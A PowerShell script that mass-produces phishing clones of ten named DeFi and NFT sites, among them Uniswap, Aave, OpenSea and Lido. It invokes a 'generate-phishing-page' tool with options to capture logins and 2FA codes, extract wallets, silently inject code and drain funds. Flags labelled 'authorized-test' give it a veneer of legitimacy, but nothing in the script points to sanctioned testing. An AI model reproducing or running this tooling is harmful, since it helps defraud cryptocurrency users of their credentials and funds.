# Batch Clone Generator - Automatically create multiple clones
# Usage: .\batch-clone-generator.ps1

param(
    [int]$count = 5,
    [string]$baseUrl = "https://app.uniswap.org"
)

$websites = @(
    @{name="uniswap"; url="https://app.uniswap.org"},
    @{name="aave"; url="https://app.aave.com"},
    @{name="opensea"; url="https://opensea.io"},
    @{name="lido"; url="https://stake.lido.fi"},
    @{name="curve"; url="https://curve.fi"},
    @{name="yearn"; url="https://yearn.finance"},
    @{name="pancakeswap"; url="https://pancakeswap.finance"},
    @{name="quickswap"; url="https://quickswap.exchange"},
    @{name="sushiswap"; url="https://www.sushi.com"},
    @{name="balancer"; url="https://app.balancer.fi"}
)

$outputDir = "C:\Users\HP\Downloads\Legion\legion-engine"
$clonesDir = "$outputDir\clones"

# Ensure clones directory exists
if (-not (Test-Path $clonesDir)) {
    New-Item -ItemType Directory -Path $clonesDir | Out-Null
}

Write-Host "🚀 Starting Batch Clone Generator" -ForegroundColor Green
Write-Host "📊 Total clones to generate: $count" -ForegroundColor Cyan
Write-Host "📁 Output directory: $clonesDir" -ForegroundColor Cyan
Write-Host ""

$successCount = 0
$failureCount = 0

for ($i = 0; $i -lt $count; $i++) {
    $website = $websites[$i % $websites.Count]
    $name = $website.name
    $url = $website.url

    Write-Host "[$($i+1)/$count] Generating: $name" -ForegroundColor Yellow
    Write-Host "  URL: $url" -ForegroundColor Gray

    try {
        $clonePath = "$clonesDir\$name"

        # Delete existing clone
        if (Test-Path $clonePath) {
            Remove-Item -Recurse -Force $clonePath
        }

        # Generate clone WITH ALL FEATURES
        $cmd = "pnpm exec tsx scripts/generate-phishing-page.ts --authorized-test --internal-authorized --silent-inject --extract-repo-components --extract-wallets --capture-login --capture-2fa --enable-universal-mode --enable-draining --mirror $url $clonePath"
        Invoke-Expression $cmd

        Write-Host "  ✅ Success - Clone created at: $clonePath" -ForegroundColor Green
        $successCount++
    }
    catch {
        Write-Host "  ❌ Failed: $_" -ForegroundColor Red
        $failureCount++
    }

    Write-Host ""
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "📈 Summary:" -ForegroundColor Green
Write-Host "  ✅ Success: $successCount" -ForegroundColor Green
Write-Host "  ❌ Failed: $failureCount" -ForegroundColor Red
Write-Host "  📁 Location: $clonesDir" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
